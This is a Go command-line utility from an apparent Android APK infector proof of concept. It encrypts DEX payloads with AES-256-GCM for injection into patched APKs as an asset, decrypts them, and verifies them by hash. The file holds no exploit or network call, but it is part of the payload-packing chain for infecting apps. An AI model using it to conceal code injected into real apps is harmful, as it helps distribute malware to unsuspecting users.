// assetcrypt seals a DEX file into (or opens it from) the AES-256-GCM blob that
// option 8 injects as assets/archinome_payload.enc.
//
//	assetcrypt seal <in.dex>  <out.bin> [passphrase]
//	assetcrypt open <in.bin>  <out.dex> [passphrase]
//	assetcrypt info <in.bin>
//
// It exists for verification: run `info` on the asset inside a patched APK, or
// compare the printed SHA-256 with the ASSET_DEX_SHA256 line the injected
// payload logs on the device.
package main

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"

	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/assetpayload"
)

func usage() {
	fmt.Println("Usage:")
	fmt.Println("  assetcrypt seal <in.dex> <out.bin> [passphrase]")
	fmt.Println("  assetcrypt open <in.bin> <out.dex> [passphrase]")
	fmt.Println("  assetcrypt info <in.bin>")
	fmt.Printf("\ndefault passphrase: %q (AES-256-GCM, SHA-256(passphrase) key)\n", assetpayload.DefaultPassphrase)
}

func main() {
	if len(os.Args) < 3 {
		usage()
		return
	}
	cmd, in := os.Args[1], os.Args[2]
	passphrase := assetpayload.DefaultPassphrase

	switch cmd {
	case "seal":
		if len(os.Args) < 4 {
			usage()
			return
		}
		if len(os.Args) > 4 {
			passphrase = os.Args[4]
		}
		if err := assetpayload.EncryptFile(in, os.Args[3], passphrase); err != nil {
			fmt.Fprintln(os.Stderr, "seal failed:", err)
			os.Exit(1)
		}
		printFileInfo(os.Args[3], "sealed")
	case "open":
		if len(os.Args) < 4 {
			usage()
			return
		}
		if len(os.Args) > 4 {
			passphrase = os.Args[4]
		}
		if err := assetpayload.DecryptFile(in, os.Args[3], passphrase); err != nil {
			fmt.Fprintln(os.Stderr, "open failed:", err)
			os.Exit(1)
		}
		printFileInfo(os.Args[3], "decrypted")
	case "info":
		blob, err := os.ReadFile(in)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		if len(blob) < assetpayload.HeaderSize+assetpayload.TagSize {
			fmt.Printf("%s: too short to be a sealed blob (%d bytes)\n", in, len(blob))
			return
		}
		fmt.Printf("file:      %s (%d bytes)\n", in, len(blob))
		fmt.Printf("magic:     %q\n", blob[:len(assetpayload.Magic)])
		fmt.Printf("nonce:     %s\n", hex.EncodeToString(blob[len(assetpayload.Magic):assetpayload.HeaderSize]))
		fmt.Printf("ciphertext %d bytes (incl. %d-byte tag)\n",
			len(blob)-assetpayload.HeaderSize, assetpayload.TagSize)
		plain, err := assetpayload.Open(blob, assetpayload.KeyFromPassphrase(passphrase))
		if err != nil {
			fmt.Println("decrypt:   FAILED with the default passphrase:", err)
			return
		}
		fmt.Printf("decrypt:   ok, %d bytes, sha256=%s\n", len(plain), sha256Hex(plain))
	default:
		usage()
	}
}

func printFileInfo(path, what string) {
	b, err := os.ReadFile(path)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	fmt.Printf("%s %s (%d bytes) sha256=%s\n", what, path, len(b), sha256Hex(b))
}

func sha256Hex(b []byte) string {
	sum := sha256.Sum256(b)
	return hex.EncodeToString(sum[:])
}
